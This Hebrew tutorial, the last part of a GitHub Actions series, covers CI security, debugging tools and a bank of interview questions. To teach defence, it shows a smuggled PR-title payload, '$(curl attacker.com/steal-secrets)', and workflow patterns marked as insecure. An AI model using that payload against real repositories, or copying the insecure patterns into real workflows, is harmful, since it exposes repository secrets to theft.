---
title: "אבטחה, Debugging, Best Practices ושאלות ראיון עבודה מקיפות"
description: "עקרונות אבטחה כמו Least Privilege ו-Pinning, סכנות Script Injection ו-pull_request_target, כלי Debugging כמו tmate ו-act, ובנק שאלות ראיון."
category: DevOps/GitHub Actions
part: 10/10
---

## עקרונות אבטחה מרכזיים

### 1. הרשאה מינימלית (Least Privilege)

תמיד הגדירו `permissions` מפורש בראש קובץ ה-workflow:

```yaml
permissions:
  contents: read   # ברירת מחדל מומלצת - קריאה בלבד

jobs:
  comment-pr:
    permissions:
      pull-requests: write   # רק ה-job הספציפי הזה מקבל הרשאה נוספת
    runs-on: ubuntu-latest
    steps:
      - run: echo "מוסיף תגובה..."
```

### 2. נעילת Actions לגרסה מדויקת (Pinning)

```yaml
# מומלץ - נעילה ל-commit SHA מלא
- uses: actions/checkout@8459bb2d97a3f5b19d1a58d1ec4a80fc9a41f7d8

# סביר - נעילה לתגית גרסה
- uses: actions/checkout@v4

# מסוכן - עלול להשתנות בכל רגע
- uses: actions/checkout@main
```

### 3. אימות אישורי גישה עם OIDC במקום secrets סטטיים

כפי שהורחב במדריך 4 - במקום מפתחות AWS/Azure/GCP קבועים, השתמשו ב-OpenID Connect לקבלת טוקן זמני שתקף לריצה בודדת בלבד.

### 4. הימנעות מ-checkout של קוד לא מהימן עם הרשאות מלאות

```yaml
# מסוכן: pull_request_target עם checkout של קוד ה-PR עצמו
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # קוד לא מהימן!
      - run: npm ci && npm run build   # עלול להריץ קוד זדוני מה-PR
```

הבעיה: `pull_request_target` מריץ עם הרשאות מלאות (כולל גישה ל-secrets) של הענף הבסיסי, אבל אם עושים checkout לקוד מה-PR עצמו (שיכול להגיע מכל אחד), אתם למעשה מריצים קוד לא מהימן עם הרשאות גבוהות.

### 5. הגנה על Cache מפני הרעלה (Cache Poisoning)

Cache לא חתום ולא מאומת - כל workflow שיכול לקרוא cache יכול גם "להרעיל" אותו. אין לשמור בו מידע רגיש, ומומלץ להגביל כתיבת cache רק ל-triggers מהימנים.

## Script Injection - הסכנה הנסתרת

אחת מפרצות האבטחה הנפוצות ביותר ב-GitHub Actions היא הזרקת קוד דרך תוכן שנשלט על ידי המשתמש (כמו כותרת PR או הודעת commit), כשהוא מוזרק ישירות לתוך `run:`:

```yaml
# מסוכן - כותרת ה-PR מוזרקת ישירות ל-shell
steps:
  - run: echo "PR title: ${{ github.event.pull_request.title }}"
```

אם כותרת ה-PR מכילה, למשל, ` $(curl attacker.com/steal-secrets)` - הפקודה עלולה להתבצע בפועל בתוך ה-shell!

**הפתרון הנכון** - העברת הערך דרך משתנה סביבה, ולא ישירות לתוך מחרוזת ה-`run`:

```yaml
# בטוח - הערך עובר כמשתנה סביבה, לא כחלק ממחרוזת הפקודה
steps:
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "PR title: $PR_TITLE"
```

כלל אצבע: **לעולם אל תשלבו `${{ github.event.* }}` ישירות בתוך מחרוזת `run:`** - תמיד העבירו דרך `env:`.

## pull_request_target - שימוש זהיר

מתי בכל זאת נכון להשתמש ב-`pull_request_target`? כאשר צריך גישה ל-secrets (למשל, להגיב על PR עם טוקן) אבל **בלי** להריץ את הקוד של ה-PR עצמו:

```yaml
on: pull_request_target

jobs:
  label-pr:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      # אין checkout של קוד ה-PR - רק פעולה על ה-metadata שלו
      - uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              labels: ['needs-review']
            })
```

## Debugging - איך מאתרים בעיות

### הפעלת לוגים מפורטים (debug logging)

הגדירו secrets ברמת הריפו:
- `ACTIONS_STEP_DEBUG` = `true` - מציג לוגים מפורטים לכל step.
- `ACTIONS_RUNNER_DEBUG` = `true` - מציג לוגים מפורטים על ה-runner עצמו.

### הדפסת קונטקסט מלא לצורך אבחון

```yaml
steps:
  - name: הדפסת כל הקונטקסט github
    run: echo '${{ toJSON(github) }}'

  - name: הדפסת כל משתני הסביבה
    run: env | sort
```

### שימוש ב-tmate להתחברות אינטראקטיבית ל-runner (לצורך דיבאג בלבד)

```yaml
steps:
  - name: פתיחת session אינטראקטיבי לדיבאג
    if: failure()
    uses: mxschmitt/action-tmate@v3
    timeout-minutes: 15
```

ה-step הזה, כשמופעל, מדפיס בלוג פקודת SSH שמאפשרת להתחבר ישירות ל-runner ולחקור את מצב הכישלון - שימושי מאוד לבאגים שקשה לשחזר.

### בדיקת workflow syntax לפני push

```bash
# התקנת actionlint
brew install actionlint   # macOS
# או הורדה ישירה מ-GitHub Releases

# הרצה
actionlint .github/workflows/*.yml
```

### הרצה מקומית עם act

כלי `act` מריץ workflows ב-Docker לוקאלית, בלי צורך לדחוף לריפו בכל בדיקה:

```bash
act push -j build
```

## Best Practices מסכמים

1. **נעלו Actions לגרסה** (טאג או SHA), הימנעו מ-`@main`.
2. **הגדירו `permissions` מפורש** בכל workflow, ברמת הריפו וברמת job.
3. **השתמשו ב-OIDC** במקום מפתחות ענן קבועים.
4. **לעולם אל תזריקו `github.event.*` ישירות ל-`run:`** - השתמשו ב-`env:`.
5. **הימנעו מ-`pull_request_target` עם checkout של קוד PR חיצוני**.
6. **הגדירו `timeout-minutes`** על כל job כדי למנוע ריצות תקועות.
7. **בדקו Actions צד-שלישי** לפני שימוש - פופולריות, תחזוקה, קוד מקור.
8. **הפעילו Dependabot** לעדכון גרסאות Actions אוטומטי.
9. **השתמשו ב-environments עם required reviewers** לפריסות רגישות.
10. **תעדו כל workflow** עם `name` ו-`description` ברורים, כדי שהצוות יבין מה כל אחד עושה.

## בנק שאלות ראיון עבודה מקיף

### רמה בסיסית

<details class="qa">
<summary>1. מה זה GitHub Actions במשפט אחד?</summary>

פלטפורמת CI/CD ואוטומציה מובנית ב-GitHub, המאפשרת הרצת תהליכים אוטומטיים בתגובה לאירועים בריפוזיטורי.

</details>

<details class="qa">
<summary>2. מה ההבדל בין Workflow, Job, ו-Step?</summary>

Workflow הוא התהליך השלם המוגדר בקובץ YAML; Job הוא קבוצת steps שרצה על runner אחד; Step הוא פעולה בודדת (command או Action) בתוך job.

</details>

<details class="qa">
<summary>3. איפה שומרים קובצי workflow?</summary>

בתיקייה `.github/workflows/` בשורש הריפו, כקבצי YAML.

</details>

<details class="qa">
<summary>4. מה ההבדל בין <code>push</code> ל-<code>pull_request</code> כטריגר?</summary>

`push` מגיב לדחיפת קוד ישירה לענף; `pull_request` מגיב לפעולות על Pull Request, ורץ עם הרשאות מוגבלות יותר כשמדובר ב-PR מ-fork חיצוני.

</details>

<details class="qa">
<summary>5. מה זה <code>GITHUB_TOKEN</code>?</summary>

טוקן זמני שנוצר אוטומטית בתחילת כל ריצת workflow, לצורך אינטראקציה עם ה-API של הריפו לפי ההרשאות שהוגדרו.

</details>

### רמה בינונית

<details class="qa">
<summary>6. מה ההבדל בין Secret ל-Variable?</summary>

Secret הוא ערך מוצפן שמוסתר מלוגים, מיועד למידע רגיש; Variable הוא ערך רגיל ולא מוצפן, מיועד לקונפיגורציה כללית.

</details>

<details class="qa">
<summary>7. איך גורמים ל-job להיות תלוי בסיום מוצלח של job אחר?</summary>

באמצעות `needs: <job_id>` - וברירת המחדל היא שה-job הנוכחי לא ירוץ אם ה-job שהוא תלוי בו נכשל.

</details>

<details class="qa">
<summary>8. מה זה Matrix Strategy?</summary>

מנגנון שיוצר אוטומטית מספר jobs מקומבינציות של משתנים (כמו OS וגרסת שפה) מהגדרה יחידה, במקום לכתוב job נפרד לכל קומבינציה.

</details>

<details class="qa">
<summary>9. מה ההבדל בין <code>artifacts</code> ל-<code>outputs</code>?</summary>

Artifacts מיועדים להעברת קבצים שלמים בין jobs; Outputs מיועדים לערכים טקסטואליים קצרים.

</details>

<details class="qa">
<summary>10. איך מריצים workflow ידנית עם פרמטרים?</summary>

באמצעות טריגר `workflow_dispatch` עם `inputs` מוגדרים מראש.

</details>

<details class="qa">
<summary>11. מה זה reusable workflow?</summary>

Workflow שמוגדר עם `on: workflow_call`, וניתן "לקרוא" אליו מ-workflows אחרים - מצמצם כפילות קוד.

</details>

<details class="qa">
<summary>12. איך מונעים ריצה כפולה של workflow באותו ענף בזמן קצר?</summary>

באמצעות `concurrency` עם `group` מוגדר ו-`cancel-in-progress: true`.

</details>

### רמה מתקדמת

<details class="qa">
<summary>13. מה זה script injection ב-GitHub Actions, ואיך מונעים אותו?</summary>

פרצת אבטחה שבה תוכן שנשלט על ידי המשתמש (כמו כותרת PR) מוזרק ישירות לתוך `run:` ומאפשר הרצת קוד זדוני. הפתרון: להעביר ערכים דרך `env:` ולא ישירות במחרוזת הפקודה.

</details>

<details class="qa">
<summary>14. מה הסיכון בשימוש ב-<code>pull_request_target</code> יחד עם checkout של קוד ה-PR?</summary>

`pull_request_target` רץ עם הרשאות מלאות (כולל secrets) של הענף הבסיסי, גם עבור PR מ-fork. אם עושים checkout לקוד ה-PR עצמו ומריצים אותו, זה בפועל מריץ קוד לא מהימן עם הרשאות גבוהות - חור אבטחה חמור.

</details>

<details class="qa">
<summary>15. מה זה OIDC ואיך הוא משפר אבטחה בפריסות לענן?</summary>

OpenID Connect מאפשר קבלת טוקן זמני וממוקד-הרשאות בזמן ריצה במקום החזקת מפתחות סטטיים כ-secrets, מה שמצמצם משמעותית סיכון דליפת אישורים.

</details>

<details class="qa">
<summary>16. איך אפשר לצמצם את ההרשאות של GITHUB_TOKEN?</summary>

באמצעות מפתח `permissions` בראש קובץ ה-workflow (ואופציונלית ברמת job ספציפי), תוך מתן רק ההרשאות המינימליות הנדרשות בפועל.

</details>

<details class="qa">
<summary>17. מה ההבדל בין נעילת Action לתגית גרסה (<code>@v4</code>) לנעילה ל-commit SHA?</summary>

תגית עלולה תיאורטית להשתנות (אם כי זו פרקטיקה גרועה); commit SHA הוא immutable לחלוטין ומבטיח שאותו קוד בדיוק ירוץ תמיד - הדרך הבטוחה ביותר.

</details>

<details class="qa">
<summary>18. איך מגדירים אישור ידני לפני פריסה לפרודקשן?</summary>

באמצעות `environment: production` ברמת job, עם "required reviewers" מוגדרים בהגדרות ה-Environment בממשק GitHub.

</details>

<details class="qa">
<summary>19. מה זה cache poisoning ב-GitHub Actions, ואיך מגנים מפניו?</summary>

מצב שבו workflow זדוני "מזהם" cache משותף עם תוכן פוגעני שנטען מאוחר יותר על ידי workflow אחר. הגנה: אין לשמור מידע רגיש בקאש, ולהגביל כתיבת קאש ל-triggers מהימנים בלבד.

</details>

<details class="qa">
<summary>20. איך אפשר להריץ debugging אינטראקטיבי (SSH) לתוך runner בזמן כישלון?</summary>

באמצעות Action כמו `mxschmitt/action-tmate`, המופעל בתנאי `if: failure()` ופותח session SSH זמני לחקירת מצב הכישלון.

</details>

### שאלות תרחישיות (Scenario-based)

<details class="qa">
<summary>21. אתם רואים ש-workflow לוקח יותר מדי זמן. אילו שלושה שינויים תבדקו ראשונים?</summary>

(1) הוספת `actions/cache` לתלויות שלא השתנו; (2) פיצול jobs עצמאיים שרצים כרגע ברצף לריצה מקבילה; (3) שימוש ב-matrix עם sharding אם מדובר בסוויטת בדיקות כבדה.

</details>

<details class="qa">
<summary>22. מפתח מתלונן שה-secret שלו "לא עובד" ב-PR מ-fork חיצוני. מה ההסבר הסביר?</summary>

Secrets רגילים (חוץ מ-GITHUB_TOKEN מוגבל) אינם זמינים אוטומטית עבור PR שמגיע מ-fork, מטעמי אבטחה - זה מונע גניבת סודות דרך PR זדוני.

</details>

<details class="qa">
<summary>23. איך הייתם בונים pipeline שבודק קוד בכל PR, אבל פורס לפרודקשן רק לאחר merge ל-main ואישור ידני?</summary>

CI (lint+test) על טריגר `pull_request`; לאחר merge, workflow נפרד (או `if: github.ref == 'refs/heads/main'`) שפורס ל-staging, מריץ smoke test, ולבסוף `environment: production` עם required reviewers לפני הפריסה הסופית.

</details>

<details class="qa">
<summary>24. ה-workflow שלכם נכשל רק בסביבת Windows במטריצה, אך עובד ב-Linux. מה תבדקו?</summary>

הבדלי path separators (`/` מול `\`), הבדלי shell ברירת מחדל (PowerShell מול bash), ותלויות ספציפיות למערכת הפעלה - אפשר גם להוסיף `shell: bash` מפורש כדי לאחד התנהגות.

</details>

<details class="qa">
<summary>25. איך תוודאו שריצות ה-CI לא "יאכלו" את כל דקות ה-Actions של הארגון?</summary>

הגדרת `timeout-minutes` סבירה לכל job, שימוש נכון ב-`paths`/`paths-ignore` כדי לדלג על ריצות מיותרות, וניצול caching כדי לקצר זמני ריצה.

</details>

### שאלות "מה ההבדל בין..."

<details class="qa">
<summary>26. מה ההבדל בין Continuous Delivery ל-Continuous Deployment?</summary>

Delivery - הקוד תמיד מוכן לפריסה אך דורש אישור ידני; Deployment - הפריסה קורית אוטומטית לחלוטין ללא התערבות אנושית.

</details>

<details class="qa">
<summary>27. מה ההבדל בין Composite Action ל-Reusable Workflow?</summary>

Composite Action עוטף steps בתוך job בודד (ניתן לשימוש בכל job); Reusable Workflow הוא workflow שלם עם jobs מרובים, שנקרא ברמת ה-workflow.

</details>

<details class="qa">
<summary>28. מה ההבדל בין <code>workflow_dispatch</code> ל-<code>repository_dispatch</code>?</summary>

`workflow_dispatch` מיועד להפעלה ידנית דרך ממשק GitHub או API; `repository_dispatch` מיועד להפעלה חיצונית (מ-CI/CD אחר, webhook, שירות צד שלישי) דרך קריאת REST API.

</details>

<details class="qa">
<summary>29. מה ההבדל בין self-hosted runner ל-GitHub-hosted runner מבחינת אבטחה?</summary>

GitHub-hosted הוא אפמרי לחלוטין (נמחק אחרי כל ריצה) ומנוהל על ידי GitHub; self-hosted נשאר קיים בין ריצות, ולכן דורש הקשחה עצמאית (במיוחד בריפו ציבורי, שם PR זדוני עלול להריץ קוד על התשתית שלכם).

</details>

<details class="qa">
<summary>30. מה ההבדל בין <code>if: success()</code> (ברירת מחדל) ל-<code>if: always()</code>?</summary>

`success()` מריץ step רק אם כל השלבים הקודמים הצליחו; `always()` מריץ תמיד, בין אם הצליחו ובין אם לא - שימושי לניקוי (cleanup) או שליחת התראות בכל מקרה.

</details>

## קישורים חיצוניים

### תיעוד רשמי (GitHub Docs)
- [Security for GitHub Actions - מרכז האבטחה הרשמי](https://docs.github.com/en/actions/how-tos/security-for-github-actions)
- [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository)
- [Using secrets in GitHub Actions](https://docs.github.com/actions/security-guides/using-secrets-in-github-actions)
- [דף הבית של תיעוד GitHub Actions](https://docs.github.com/en/actions)

### סרטוני יוטיוב מומלצים
- [GitHub Actions Tutorial | From Zero to Hero in 90 minutes](https://www.youtube.com/watch?v=TLB5MY9BBa4)
- [Complete GitHub Actions Course - From BEGINNER to PRO](https://www.youtube.com/watch?v=Xwpi0ITkL3U)
- [GitHub Actions: The Full Course - Learn by Doing! (פלייליסט)](https://youtube.com/playlist?list=PLArH6NjfKsUhvGHrpag7SuPumMzQRhUKY)

---

**סיימתם את סדרת המדריכים!** חזרו למדריך 1 לרענון היסודות, או השתמשו בבנק השאלות במדריך הזה כהכנה לראיון עבודה. בהצלחה! 🚀
